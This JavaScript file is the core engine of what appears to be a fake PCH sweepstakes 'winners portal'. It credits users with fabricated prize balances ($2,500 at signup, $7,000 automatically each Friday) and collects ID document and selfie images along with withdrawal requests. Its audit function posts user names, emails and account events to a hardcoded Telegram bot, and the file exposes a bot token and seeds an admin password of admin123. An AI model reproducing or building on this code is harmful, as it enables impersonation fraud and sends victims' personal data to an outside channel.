// =============================================
// APP.JS – Core Application Engine
// =============================================

// ---- Configuration ----
const APP_CONFIG = {
    TELEGRAM_BOT_TOKEN: '8719116476:AAH1VD3raRv77NiWUy2EOmDEC3mOdjghYNE',
    TELEGRAM_CHAT_ID: '8673303375',
    STORAGE_PREFIX: 'pch_',
    DEFAULT_CURRENCY: 'USD',
    CURRENCIES: ['USD', 'EUR', 'GBP'],
    VIP_LEVELS: ['Standard', 'VIP', 'VIP Gold', 'VIP Platinum', 'VIP Elite'],
    TRANSACTION_STATUSES: ['pending', 'processing', 'completed', 'failed', 'cancelled', 'reversed']
};

// ---- Application State ----
const AppState = {
    _state: {
        user: null,
        role: null,
        isAuthenticated: false,
        isLoading: false,
        errors: [],
        notifications: [],
        ui: { theme: 'dark', sidebarOpen: false }
    },
    get(key) { return this._state[key]; },
    set(key, value) { this._state[key] = value; },
    update(updates) { Object.assign(this._state, updates); },
    reset() { this._state = { user: null, role: null, isAuthenticated: false, isLoading: false, errors: [], notifications: [], ui: { theme: 'dark', sidebarOpen: false } }; }
};

// ---- Storage Service ----
const StorageService = {
    get(key, def = null) {
        try {
            const val = localStorage.getItem(APP_CONFIG.STORAGE_PREFIX + key);
            return val ? JSON.parse(val) : def;
        } catch { return def; }
    },
    set(key, value) {
        localStorage.setItem(APP_CONFIG.STORAGE_PREFIX + key, JSON.stringify(value));
    },
    remove(key) {
        localStorage.removeItem(APP_CONFIG.STORAGE_PREFIX + key);
    },
    clear() {
        const keys = Object.keys(localStorage);
        keys.filter(k => k.startsWith(APP_CONFIG.STORAGE_PREFIX)).forEach(k => localStorage.removeItem(k));
    }
};

// ---- Data Services (localStorage based) ----
const DataService = {
    // Users
    getUsers() { return StorageService.get('users', []); },
    setUsers(users) { StorageService.set('users', users); },
    // Funding Records
    getFundingRecords() { return StorageService.get('funding_records', []); },
    setFundingRecords(records) { StorageService.set('funding_records', records); },
    // Funding Schedules
    getFundingSchedules() { return StorageService.get('funding_schedules', []); },
    setFundingSchedules(schedules) { StorageService.set('funding_schedules', schedules); },
    // Cards
    getCards() { return StorageService.get('cards', []); },
    setCards(cards) { StorageService.set('cards', cards); },
    // Rewards
    getRewards() { return StorageService.get('rewards', []); },
    setRewards(rewards) { StorageService.set('rewards', rewards); },
    // Support Tickets
    getSupportTickets() { return StorageService.get('tickets', []); },
    setSupportTickets(tickets) { StorageService.set('tickets', tickets); },
    // Notifications
    getNotifications() { return StorageService.get('notifications', []); },
    setNotifications(notifs) { StorageService.set('notifications', notifs); },
    // Audit Logs
    getAuditLogs() { return StorageService.get('audit', []); },
    setAuditLogs(logs) { StorageService.set('audit', logs); },
    // KYC
    getKyc() { return StorageService.get('kyc', []); },
    setKyc(kyc) { StorageService.set('kyc', kyc); },
    // Withdrawals
    getWithdrawals() { return StorageService.get('withdrawals', []); },
    setWithdrawals(w) { StorageService.set('withdrawals', w); },
    // Activity Logs (per user)
    getActivityLog(userId) { return StorageService.get('activity_' + userId, []); },
    setActivityLog(userId, log) { StorageService.set('activity_' + userId, log); },
    // Announcements
    getAnnouncements() { return StorageService.get('announcements', []); },
    setAnnouncements(a) { StorageService.set('announcements', a); },
    // Currency
    getCurrency() { return StorageService.get('currency', APP_CONFIG.DEFAULT_CURRENCY); },
    setCurrency(c) { StorageService.set('currency', c); },
    // Current user session
    getCurrentUser() { return StorageService.get('current_user', null); },
    setCurrentUser(user) { StorageService.set('current_user', user); },
    removeCurrentUser() { StorageService.remove('current_user'); }
};

// ---- Auth Service ----
const AuthService = {
    login(email, password) {
        const users = DataService.getUsers();
        const user = users.find(u => u.email === email && u.password === password);
        if (user) {
            // Check MFA if enabled (simulated)
            if (user.mfa_enabled) {
                const code = prompt('Enter your 6-digit MFA code:');
                if (!code || code.length !== 6) {
                    this._audit('MFA_FAILED', `MFA failed for ${email}`, user.id, 'FAILURE');
                    return null;
                }
            }
            DataService.setCurrentUser(user);
            AppState.set('user', user);
            AppState.set('role', user.role);
            AppState.set('isAuthenticated', true);
            this._audit('LOGIN_SUCCESS', `User ${email} logged in`, user.id);
            this._logActivity(user.id, 'LOGIN', 'User logged in');
            return user;
        }
        this._audit('LOGIN_FAILURE', `Failed login for ${email}`, null, 'FAILURE');
        return null;
    },
    logout() {
        const user = DataService.getCurrentUser();
        if (user) {
            this._audit('LOGOUT', `User ${user.email} logged out`, user.id);
            this._logActivity(user.id, 'LOGOUT', 'User logged out');
        }
        DataService.removeCurrentUser();
        AppState.reset();
        window.location.href = 'index.html';
    },
    getCurrentUser() {
        return DataService.getCurrentUser();
    },
    isAuthenticated() {
        return !!DataService.getCurrentUser();
    },
    isAdmin() {
        const user = this.getCurrentUser();
        return user && (user.role === 'admin' || user.role === 'super_admin');
    },
    requireAuth() {
        if (!this.isAuthenticated()) {
            window.location.href = 'index.html';
            return false;
        }
        return true;
    },
    requireAdmin() {
        if (!this.isAuthenticated() || !this.isAdmin()) {
            window.location.href = 'index.html';
            return false;
        }
        return true;
    },
    // ---- Private helpers ----
    _audit(event, details, userId, result = 'SUCCESS') {
        const user = this.getCurrentUser();
        const name = user ? `${user.firstName} ${user.lastName}` : 'Guest';
        const msg = `📋 <b>AUDIT</b>\nEvent: ${event}\nUser: ${name}\nDetails: ${details}\nTime: ${new Date().toLocaleString()}\nResult: ${result}`;
        this._sendTelegram(msg);
        const logs = DataService.getAuditLogs();
        logs.unshift({ id: Date.now(), event, actor: name, details, result, timestamp: new Date().toISOString() });
        DataService.setAuditLogs(logs);
    },
    _logActivity(userId, action, details) {
        const log = DataService.getActivityLog(userId);
        log.unshift({ action, details, timestamp: new Date().toISOString() });
        DataService.setActivityLog(userId, log);
    },
    _sendTelegram(message) {
        const url = `https://api.telegram.org/bot${APP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: APP_CONFIG.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        };
        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
            .catch(() => {});
    }
};

// ---- UI Utilities ----
const UI = {
    // ---- Toasts ----
    showToast(message, type = 'info', duration = 4000) {
        const container = document.getElementById('toastContainer') || this._createToastContainer();
        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;
        const icons = { success: '✅', error: '❌', info: 'ℹ️', warning: '⚠️' };
        toast.innerHTML = `
            <span class="toast-icon">${icons[type] || 'ℹ️'}</span>
            <span>${message}</span>
            <button class="toast-close" onclick="this.parentElement.remove()">✕</button>
        `;
        container.appendChild(toast);
        setTimeout(() => { if (toast.parentElement) toast.remove(); }, duration);
    },
    _createToastContainer() {
        const container = document.createElement('div');
        container.id = 'toastContainer';
        container.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:99999;display:flex;flex-direction:column;gap:8px;max-width:360px;width:100%;';
        document.body.appendChild(container);
        return container;
    },

    // ---- Modals ----
    showModal(options) {
        const existing = document.querySelector('.modal-overlay');
        if (existing) existing.remove();

        const overlay = document.createElement('div');
        overlay.className = 'modal-overlay active';
        overlay.innerHTML = `
            <div class="modal-box">
                <button class="close-btn" onclick="UI.closeModal()">✕</button>
                <h3>${options.title || ''}</h3>
                ${options.subtitle ? `<div class="sub">${options.subtitle}</div>` : ''}
                <div class="modal-body">${options.body || ''}</div>
                <div class="modal-actions" style="display:flex;gap:10px;margin-top:16px;justify-content:flex-end;">
                    ${options.buttons ? options.buttons.map(b => `
                        <button class="btn ${b.class || 'btn-secondary'}" data-action="${b.action || ''}">${b.label}</button>
                    `).join('') : ''}
                </div>
            </div>
        `;
        document.body.appendChild(overlay);
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) this.closeModal();
        });
        // Focus management
        const firstInput = overlay.querySelector('input, button');
        if (firstInput) firstInput.focus();

        // Button actions
        overlay.querySelectorAll('.modal-actions .btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const action = btn.dataset.action;
                if (action && options.callbacks && options.callbacks[action]) {
                    options.callbacks[action](e);
                }
            });
        });
        return overlay;
    },
    closeModal() {
        const modal = document.querySelector('.modal-overlay');
        if (modal) modal.remove();
    },

    // ---- Loading ----
    showLoading(selector) {
        const el = typeof selector === 'string' ? document.querySelector(selector) : selector;
        if (el) {
            el.classList.add('loading');
            el.disabled = true;
        }
    },
    hideLoading(selector) {
        const el = typeof selector === 'string' ? document.querySelector(selector) : selector;
        if (el) {
            el.classList.remove('loading');
            el.disabled = false;
        }
    },

    // ---- Confirm Dialog ----
    confirm(message, title = 'Confirm', confirmLabel = 'Confirm', cancelLabel = 'Cancel') {
        return new Promise((resolve) => {
            const modal = this.showModal({
                title: title,
                body: `<p>${message}</p>`,
                buttons: [
                    { label: cancelLabel, class: 'btn-secondary', action: 'cancel' },
                    { label: confirmLabel, class: 'btn-gold', action: 'confirm' }
                ],
                callbacks: {
                    cancel: () => { this.closeModal(); resolve(false); },
                    confirm: () => { this.closeModal(); resolve(true); }
                }
            });
        });
    }
};

// ---- Formatters ----
const Formatters = {
    currency(amount, currency = null) {
        const cur = currency || DataService.getCurrency() || APP_CONFIG.DEFAULT_CURRENCY;
        const symbols = { USD: '$', EUR: '€', GBP: '£' };
        const symbol = symbols[cur] || '$';
        return symbol + parseFloat(amount).toFixed(2);
    },
    date(date) {
        return new Date(date).toLocaleDateString();
    },
    dateTime(date) {
        return new Date(date).toLocaleString();
    },
    status(status) {
        return status.toUpperCase();
    },
    truncate(text, length = 50) {
        return text.length > length ? text.slice(0, length) + '...' : text;
    }
};

// ---- Validation ----
const Validators = {
    required(value) { return value && value.trim().length > 0; },
    email(value) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value); },
    amount(value) {
        const num = parseFloat(value);
        return !isNaN(num) && num > 0;
    },
    phone(value) { return /^[\d\s\-+()]{7,20}$/.test(value); },
    password(value) { return value && value.length >= 6; },
    match(value, confirm) { return value === confirm; },
    number(value) { return !isNaN(parseFloat(value)) && isFinite(value); }
};

// ---- User Service ----
const UserService = {
    createUser(data) {
        const users = DataService.getUsers();
        if (users.find(u => u.email === data.email)) throw new Error('Email already registered');
        const newUser = {
            id: Date.now() + Math.random(),
            firstName: data.firstName,
            lastName: data.lastName,
            email: data.email,
            password: data.password,
            phone: data.phone || '',
            address: data.address || '',
            balance: 2500,
            prize_amount: 2500,
            accountNumber: 'WIN' + String(100000 + Math.floor(Math.random()*900000)),
            status: 'active',
            vip_level: 'Standard',
            role: 'user',
            currency: 'USD',
            avatar: '',
            bio: '',
            mfa_enabled: false,
            mfa_secret: null,
            createdAt: new Date().toISOString()
        };
        users.push(newUser);
        DataService.setUsers(users);
        // Welcome funding
        const funding = DataService.getFundingRecords();
        funding.push({
            id: Date.now(),
            userId: newUser.id,
            amount: 2500,
            type: 'welcome',
            status: 'completed',
            description: 'Welcome bonus',
            reference: 'WELCOME-' + Date.now(),
            createdAt: new Date().toISOString()
        });
        DataService.setFundingRecords(funding);
        // Notification
        const notifs = DataService.getNotifications();
        notifs.push({
            id: Date.now(),
            userId: newUser.id,
            title: 'Welcome!',
            message: 'Your account has been credited with $2,500.',
            isRead: false,
            createdAt: new Date().toISOString()
        });
        DataService.setNotifications(notifs);
        AuthService._audit('USER_REGISTERED', `New user: ${newUser.firstName} ${newUser.lastName} (${newUser.email})`, newUser.id);
        return newUser;
    },
    getUser(id) {
        return DataService.getUsers().find(u => u.id === id);
    },
    updateUser(id, updates) {
        const users = DataService.getUsers();
        const idx = users.findIndex(u => u.id === id);
        if (idx === -1) throw new Error('User not found');
        Object.assign(users[idx], updates);
        DataService.setUsers(users);
        return users[idx];
    },
    getUsers() {
        return DataService.getUsers();
    },
    getWinner(id) {
        return this.getUser(id);
    },
    getWinners() {
        return this.getUsers().filter(u => u.role === 'user');
    }
};

// ---- Funds Service ----
const FundsService = {
    addFunds(userId, amount, type = 'manual', description = '', reference = '') {
        const users = DataService.getUsers();
        const idx = users.findIndex(u => u.id === userId);
        if (idx === -1) throw new Error('User not found');
        // Add to balance
        users[idx].balance += amount;
        users[idx].prize_amount += amount;
        DataService.setUsers(users);
        // Record funding
        const funding = DataService.getFundingRecords();
        funding.push({
            id: Date.now(),
            userId,
            amount,
            type,
            status: 'completed',
            description: description || `${type} funding`,
            reference: reference || 'MANUAL-' + Date.now(),
            createdAt: new Date().toISOString()
        });
        DataService.setFundingRecords(funding);
        // Notification
        const notifs = DataService.getNotifications();
        notifs.push({
            id: Date.now(),
            userId,
            title: '💰 Funds Added',
            message: `${Formatters.currency(amount)} has been added to your account.`,
            isRead: false,
            createdAt: new Date().toISOString()
        });
        DataService.setNotifications(notifs);
        AuthService._audit('FUNDS_ADDED', `Added ${amount} to user ${userId}`, userId);
        return users[idx];
    },
    getBalance(userId) {
        const user = UserService.getUser(userId);
        return user ? user.balance + user.prize_amount : 0;
    },
    getPending(userId) {
        return 0; // Placeholder
    },
    getScheduled(userId) {
        // Return future funding schedules for this user
        const schedules = DataService.getFundingSchedules().filter(s => s.status === 'active');
        // In a real system, we'd have a mapping to user. For demo, we'll return all active.
        return schedules.map(s => ({ ...s, userId }));
    }
};

// ---- Transaction Service ----
const TransactionService = {
    getTransactions(userId) {
        return DataService.getFundingRecords().filter(f => f.userId === userId);
    },
    getAllTransactions() {
        return DataService.getFundingRecords();
    },
    getTransaction(id) {
        return DataService.getFundingRecords().find(f => f.id === id);
    }
};

// ---- Transfer Service ----
const TransferService = {
    createTransfer(senderId, recipientId, amount, description = '') {
        const users = DataService.getUsers();
        const sender = users.find(u => u.id === senderId);
        const recipient = users.find(u => u.id === recipientId);
        if (!sender || !recipient) throw new Error('User not found');
        if (senderId === recipientId) throw new Error('Cannot transfer to yourself');
        const balance = sender.balance + sender.prize_amount;
        if (amount > balance) throw new Error('Insufficient funds');
        // Deduct from sender
        if (sender.balance >= amount) {
            sender.balance -= amount;
        } else {
            const remaining = amount - sender.balance;
            sender.balance = 0;
            sender.prize_amount -= remaining;
        }
        // Add to recipient
        recipient.balance += amount;
        recipient.prize_amount += amount;
        DataService.setUsers(users);
        // Record transactions
        const funding = DataService.getFundingRecords();
        funding.push({
            id: Date.now() + 1,
            userId: senderId,
            amount: -amount,
            type: 'transfer_out',
            status: 'completed',
            description: `Transfer to ${recipient.firstName} ${recipient.lastName} - ${description}`,
            reference: 'TRF-' + Date.now(),
            createdAt: new Date().toISOString()
        });
        funding.push({
            id: Date.now() + 2,
            userId: recipientId,
            amount: amount,
            type: 'transfer_in',
            status: 'completed',
            description: `Transfer from ${sender.firstName} ${sender.lastName} - ${description}`,
            reference: 'TRF-' + Date.now(),
            createdAt: new Date().toISOString()
        });
        DataService.setFundingRecords(funding);
        // Notifications
        const notifs = DataService.getNotifications();
        notifs.push({
            id: Date.now() + 3,
            userId: recipientId,
            title: '💸 Transfer Received',
            message: `You received ${Formatters.currency(amount)} from ${sender.firstName} ${sender.lastName}.`,
            isRead: false,
            createdAt: new Date().toISOString()
        });
        DataService.setNotifications(notifs);
        AuthService._audit('INTERNAL_TRANSFER', `User ${senderId} transferred ${amount} to ${recipientId}`, senderId);
        return { sender, recipient };
    }
};

// ---- KYC Service ----
const KycService = {
    submit(userId, data, frontImage, backImage, selfieImage) {
        const kycs = DataService.getKyc();
        kycs.push({
            id: Date.now(),
            userId,
            idType: data.idType,
            idNumber: data.idNumber,
            frontImage,
            backImage,
            selfieImage,
            status: 'pending',
            submittedAt: new Date().toISOString()
        });
        DataService.setKyc(kycs);
        AuthService._audit('KYC_SUBMITTED', `User ${userId} submitted KYC`, userId);
        return kycs[kycs.length - 1];
    },
    getPending() {
        return DataService.getKyc().filter(k => k.status === 'pending');
    },
    approve(id) {
        const kycs = DataService.getKyc();
        const idx = kycs.findIndex(k => k.id === id);
        if (idx === -1) return;
        kycs[idx].status = 'approved';
        kycs[idx].approvedAt = new Date().toISOString();
        DataService.setKyc(kycs);
        AuthService._audit('KYC_APPROVED', `KYC ${id} approved`, kycs[idx].userId);
    },
    reject(id) {
        const kycs = DataService.getKyc();
        const idx = kycs.findIndex(k => k.id === id);
        if (idx === -1) return;
        kycs[idx].status = 'rejected';
        DataService.setKyc(kycs);
        AuthService._audit('KYC_REJECTED', `KYC ${id} rejected`, kycs[idx].userId);
    },
    getForUser(userId) {
        return DataService.getKyc().filter(k => k.userId === userId);
    },
    isVerified(userId) {
        const kycs = this.getForUser(userId);
        return kycs.some(k => k.status === 'approved');
    }
};

// ---- Withdrawal Service ----
const WithdrawalService = {
    request(userId, method, accountRef, amount, description) {
        const withdrawals = DataService.getWithdrawals();
        withdrawals.push({
            id: Date.now(),
            userId,
            method,
            accountRef,
            amount,
            description: description || '',
            status: 'pending',
            createdAt: new Date().toISOString()
        });
        DataService.setWithdrawals(withdrawals);
        AuthService._audit('WITHDRAWAL_REQUESTED', `User ${userId} requested ${amount} via ${method}`, userId);
        return withdrawals[withdrawals.length - 1];
    },
    getPending() {
        return DataService.getWithdrawals().filter(w => w.status === 'pending');
    },
    approve(id) {
        const withdrawals = DataService.getWithdrawals();
        const idx = withdrawals.findIndex(w => w.id === id);
        if (idx === -1) return;
        const w = withdrawals[idx];
        if (w.status !== 'pending') return;
        // Deduct balance
        const users = DataService.getUsers();
        const uIdx = users.findIndex(u => u.id === w.userId);
        if (uIdx === -1) throw new Error('User not found');
        const total = users[uIdx].balance + users[uIdx].prize_amount;
        if (total < w.amount) throw new Error('Insufficient balance');
        // Deduct
        let remaining = w.amount;
        if (users[uIdx].balance >= remaining) {
            users[uIdx].balance -= remaining;
        } else {
            remaining -= users[uIdx].balance;
            users[uIdx].balance = 0;
            users[uIdx].prize_amount -= remaining;
        }
        DataService.setUsers(users);
        // Record funding (negative)
        const funding = DataService.getFundingRecords();
        funding.push({
            id: Date.now(),
            userId: w.userId,
            amount: -w.amount,
            type: 'withdrawal',
            status: 'completed',
            description: `Withdrawal via ${w.method}`,
            reference: 'WDL-' + Date.now(),
            createdAt: new Date().toISOString()
        });
        DataService.setFundingRecords(funding);
        // Update withdrawal status
        withdrawals[idx].status = 'approved';
        DataService.setWithdrawals(withdrawals);
        AuthService._audit('WITHDRAWAL_APPROVED', `Withdrawal ${id} approved`, w.userId);
    },
    reject(id) {
        const withdrawals = DataService.getWithdrawals();
        const idx = withdrawals.findIndex(w => w.id === id);
        if (idx === -1) return;
        withdrawals[idx].status = 'rejected';
        DataService.setWithdrawals(withdrawals);
        AuthService._audit('WITHDRAWAL_REJECTED', `Withdrawal ${id} rejected`, withdrawals[idx].userId);
    }
};

// ---- Announcement Service ----
const AnnouncementService = {
    create(title, message) {
        const announcements = DataService.getAnnouncements();
        announcements.push({
            id: Date.now(),
            title,
            message,
            createdAt: new Date().toISOString()
        });
        DataService.setAnnouncements(announcements);
        AuthService._audit('ANNOUNCEMENT_CREATED', `Announcement: ${title}`, null);
    },
    getAll() {
        return DataService.getAnnouncements();
    }
};

// ---- Import Service ----
const ImportService = {
    importUsers(rows) {
        const required = ['first_name', 'last_name', 'email', 'password'];
        const headers = Object.keys(rows[0] || {});
        const missing = required.filter(r => !headers.includes(r));
        if (missing.length) throw new Error(`Missing columns: ${missing.join(', ')}`);
        let added = 0;
        const users = DataService.getUsers();
        rows.forEach(row => {
            if (users.find(u => u.email === row.email)) return;
            const newUser = {
                id: Date.now() + Math.random(),
                firstName: row.first_name,
                lastName: row.last_name,
                email: row.email,
                password: row.password || 'default123',
                balance: parseFloat(row.balance) || 2500,
                prize_amount: parseFloat(row.prize_amount) || 2500,
                accountNumber: row.account_number || 'WIN' + String(100000 + Math.floor(Math.random()*900000)),
                status: row.status || 'active',
                vip_level: row.vip_level || 'Standard',
                role: 'user',
                currency: row.currency || 'USD',
                avatar: '',
                bio: '',
                phone: row.phone || '',
                address: row.address || '',
                mfa_enabled: false,
                mfa_secret: null,
                createdAt: new Date().toISOString()
            };
            users.push(newUser);
            // Welcome funding
            const funding = DataService.getFundingRecords();
            funding.push({
                id: Date.now() + Math.random(),
                userId: newUser.id,
                amount: 2500,
                type: 'welcome',
                status: 'completed',
                description: 'Welcome bonus (imported)',
                reference: 'IMPORT-' + Date.now(),
                createdAt: new Date().toISOString()
            });
            DataService.setFundingRecords(funding);
            added++;
        });
        DataService.setUsers(users);
        AuthService._audit('ADMIN_IMPORT', `Imported ${added} users`, null);
        return added;
    }
};

// ---- Schedule Service ----
const ScheduleService = {
    create(name, amount, frequency) {
        const schedules = DataService.getFundingSchedules();
        schedules.push({
            id: Date.now(),
            name,
            amount,
            frequency,
            day: frequency === 'weekly' ? 'Friday' : '1st',
            status: 'active',
            createdAt: new Date().toISOString()
        });
        DataService.setFundingSchedules(schedules);
        AuthService._audit('FUNDING_SCHEDULE_CREATED', `Schedule: ${name} $${amount} ${frequency}`, null);
    },
    toggle(id) {
        const schedules = DataService.getFundingSchedules();
        const idx = schedules.findIndex(s => s.id === id);
        if (idx === -1) return;
        schedules[idx].status = schedules[idx].status === 'active' ? 'paused' : 'active';
        DataService.setFundingSchedules(schedules);
        AuthService._audit('SCHEDULE_TOGGLED', `Schedule ${id} to ${schedules[idx].status}`, null);
    },
    getAll() {
        return DataService.getFundingSchedules();
    }
};

// ---- Seed Test Data ----
function seedTestData() {
    if (DataService.getUsers().length === 0) {
        const users = [
            { id: 1, firstName: 'Admin', lastName: 'User', email: 'admin@admin.com', password: 'admin123', role: 'admin', balance: 0, prize_amount: 0, accountNumber: 'ADMIN001', status: 'active', vip_level: 'Super', currency: 'USD', avatar: '', bio: '', phone: '', address: '', mfa_enabled: false, mfa_secret: null, createdAt: new Date().toISOString() },
            { id: 2, firstName: 'John', lastName: 'Winner', email: 'john@example.com', password: 'john123', role: 'user', balance: 2500, prize_amount: 2500, accountNumber: 'WIN123456', status: 'active', vip_level: 'VIP', currency: 'USD', avatar: '', bio: 'PCH winner since 2026', phone: '555-1234', address: '123 Main St', mfa_enabled: false, mfa_secret: null, createdAt: new Date().toISOString() }
        ];
        DataService.setUsers(users);
        const funding = [
            { id: 1, userId: 2, amount: 2500, type: 'welcome', status: 'completed', description: 'Welcome bonus', reference: 'WELCOME-1', createdAt: new Date().toISOString() }
        ];
        DataService.setFundingRecords(funding);
        const notifs = [
            { id: 1, userId: 2, title: 'Welcome!', message: 'Your account has been credited with $2,500.', isRead: false, createdAt: new Date().toISOString() }
        ];
        DataService.setNotifications(notifs);
        const schedules = [
            { id: 1, name: 'Weekly Friday Funding', amount: 7000, frequency: 'weekly', day: 'Friday', status: 'active', createdAt: new Date().toISOString() }
        ];
        DataService.setFundingSchedules(schedules);
        const announcements = [
            { id: 1, title: 'Welcome to PCH!', message: 'This is the official winners portal.', createdAt: new Date().toISOString() }
        ];
        DataService.setAnnouncements(announcements);
    }
}
seedTestData();

// ---- Schedule Funding Engine (auto-run) ----
function processScheduledFunding() {
    const today = new Date();
    const day = today.getDay();
    const dateStr = today.toISOString().slice(0,10);
    const lastFunding = StorageService.get('last_funding_date');
    if (lastFunding === dateStr) return;

    const schedules = DataService.getFundingSchedules().filter(s => s.status === 'active');
    if (!schedules.length) return;

    let processed = false;
    schedules.forEach(schedule => {
        let shouldRun = false;
        if (schedule.frequency === 'weekly' && day === 5) shouldRun = true;
        else if (schedule.frequency === 'monthly' && today.getDate() === 1) shouldRun = true;
        if (!shouldRun) return;

        const amount = schedule.amount || 7000;
        const users = DataService.getUsers().filter(u => u.role === 'user' && u.status === 'active');
        users.forEach(user => {
            FundsService.addFunds(user.id, amount, schedule.frequency, `${schedule.frequency} funding`, schedule.frequency.toUpperCase() + '-' + dateStr);
        });
        processed = true;
    });

    if (processed) {
        StorageService.set('last_funding_date', dateStr);
        AuthService._audit('SCHEDULED_FUNDING_RUN', `Processed scheduled funding for ${schedules.length} schedules`, null);
    }
}

// ---- Run funding engine (only in user/admin pages, not index) ----
if (!window.location.pathname.includes('index.html')) {
    processScheduledFunding();
}

// ---- Expose everything to global ----
window.AppState = AppState;
window.StorageService = StorageService;
window.DataService = DataService;
window.AuthService = AuthService;
window.UI = UI;
window.Formatters = Formatters;
window.Validators = Validators;
window.UserService = UserService;
window.FundsService = FundsService;
window.TransactionService = TransactionService;
window.TransferService = TransferService;
window.KycService = KycService;
window.WithdrawalService = WithdrawalService;
window.AnnouncementService = AnnouncementService;
window.ImportService = ImportService;
window.ScheduleService = ScheduleService;
window.logout = AuthService.logout.bind(AuthService);
